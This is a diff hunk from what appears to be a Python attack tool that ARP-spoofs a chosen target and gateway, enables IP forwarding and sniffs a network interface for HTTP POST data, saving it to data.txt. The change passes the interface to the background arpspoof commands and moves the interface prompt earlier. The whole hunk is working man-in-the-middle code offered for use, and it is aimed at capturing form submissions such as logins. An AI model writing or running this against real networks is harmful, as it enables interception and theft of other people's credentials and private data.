@@ -180,20 +180,20 @@ print(colored("[+] Gateway specified: " + gateway, "green"))
 print(colored("----------------------------------------------------------------------------------------", "green"))
 
 
-def arpspoof(target, gateway):
+def arpspoof(target, gateway, iface):
     os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # enable port forwarding
-    os.system("arpspoof -t " + gateway + " " + target + " 1>/dev/null 2>/dev/null &")  # spoof the target
-    os.system("arpspoof -t " + target + " " + gateway + " 1>/dev/null 2>/dev/null &")  # spoof the gateway
-
-
-print(colored("[-] Enabling IPv4 Port Forwarding...", "yellow"))
-print(colored("[-] Spoofing target and gateway...", "yellow"))
-
-arpspoof(target, gateway)
-print(colored("----------------------------------------------------------------------------------------", "green"))
+    os.system("arpspoof -t " + gateway + " " + target + " -i " + iface + " 1>/dev/null 2>/dev/null &")  # spoof the target
+    os.system("arpspoof -t " + target + " " + gateway + " -i " + iface + " 1>/dev/null 2>/dev/null &")  # spoof the gateway
 
 
 iface = input(colored("[-] Input your network interface to sniff ('ifconfig' or 'ip a' command on Linux): ", "yellow"))
+print(colored("[-] Enabling IPv4 Port Forwarding...", "yellow"))
+print(colored("[-] Spoofing target and gateway...", "yellow"))
+
+arpspoof(target, gateway, iface)
+print(colored("----------------------------------------------------------------------------------------", "green"))
+
+
 print(colored("[+] Listening on " + iface + " for any HTTP POST data...", "yellow"))
 print(colored("[+] Data will be save in data.txt in the same directory", "yellow"))
 print(colored("[+] You have to check the data by hand to find what you're interested in", "yellow"))
